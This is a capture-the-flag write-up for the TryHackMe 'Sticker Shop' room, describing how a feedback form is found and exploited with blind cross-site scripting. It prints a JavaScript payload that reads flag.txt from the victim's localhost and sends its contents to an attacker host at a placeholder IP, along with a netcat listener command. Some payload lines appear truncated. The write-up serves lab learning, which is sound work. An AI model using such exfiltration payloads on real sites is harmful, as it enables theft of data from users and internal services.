<img width="100" align="center" alt="thm" src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377390091" />

# The Sticker Shop 
**Can you exploit the sticker shop in order to capture the flag?**

Starting task, as we are going to face with a server run by a Local Sticker Shop hosted. I started the machine and jump over it.

<img alt="starting the machine" src="https://github.com/user-attachments/assets/15653f9d-7c60-470b-b242-cd5c12b856a9" />

<img width="1000" align="catppuccin line" src="https://github-production-user-asset-6210df.s3.amazonaws.com/109761382/399944576-8a04c1c1-9f58-4f23-9548-4c71971b3576.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20260109%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260109T140147Z&X-Amz-Expires=300&X-Amz-Signature=2be548619a8625a1b197b2e29de99408a8bbcf92c682e5bcf78b16cc0cdd6762&X-Amz-SignedHeaders=host" />

The first step I took is to visit the website and looked for the source and found ``/submit_feedback`` dir, which catched me.

| <img widht="900" src="https://github.com/user-attachments/assets/4a67214b-a540-4705-a765-53b4eff79e2e" /> | <img width="900" src="https://github.com/user-attachments/assets/6741784c-c161-4b4d-a135-e871ae2f9742" /> |
| --- | --- |

And I visited to **``/submit_feedback``** and found a submition functionality available.

<img width="1000" alt="Screenshot from 2025-01-03 07-33-51" src="https://github.com/user-attachments/assets/0f94ce61-f51c-4e6c-afdd-99ee943ce345" />

<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />

As soon I saw this, I just started to try random XSS payloads, from [payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list), and cam to this payload..

```js
:8080')"/>
```
>[!NOTE]
> In the above payload an image would be loaded as img tag refers to **X** location, since the src fail to load and it simply goes to execute following and we just can grap the http request using ``nc``
>```js
> fetch('http://<ip>:8080');
>```
And I just ``nc`` the headers before the submition of the payload, and yeah like this !!!
```bash
nc -knvlp 8080
```

| ![Screenshot from 2025-01-03 08-10-35](https://github.com/user-attachments/assets/dd775ed6-f065-4a75-b271-1ee69639c288) | ![Screenshot from 2025-01-03 08-08-40](https://github.com/user-attachments/assets/ba98eb99-9e6f-452a-8058-fcee51bed3e4) |
| --- | --- |
<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
Now to grab the flag I have used the following payload..

```js
 r.text()).then(r => fetch('http://<ip>:8080/?c=' + r)).catch(e => fetch('http://<ip>:8080/?c=' + e))"/>
```
>[!NOTE]
> Componenets..
* ``````  - The image ``src`` is invalid, causing the ``onerror`` attribute to execute when the browser fails to load the image. 
* ```fetch('http://127.0.0.1:8080/flag.txt')``` - This initiates an HTTP GET request to the victim's localhost at port 8080, targeting the ``flag.txt`` file.
* ```.then(r => r.text())``` - If the request succeeds, this processes the response (``r``) and converts it into text using the ``.text()`` method.
* ```.then(r => fetch('http://<ip>:8080/?c=' + r))``` - After retrieving the file content, another ``fetch`` request sends the content (``r``) to the attacker's server (``http://<ip>:8080``) as part of the query string (``?c=...``).
* ```.catch(e => fetch('http://<ip>:8080/?c=' + e))``` - If the initial ``fetch`` fails (e.g., the file doesn't exist or CORS blocks the request), the ``catch`` block handles the error and sends the error message (``e``) to the attacker's server.
<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
<img width="1000"  alt="flag png" src="https://github.com/user-attachments/assets/6d86b886-7eed-492d-86c9-05cb9a1b6d09" />

***Yes! Thank you for reading till here ;)***

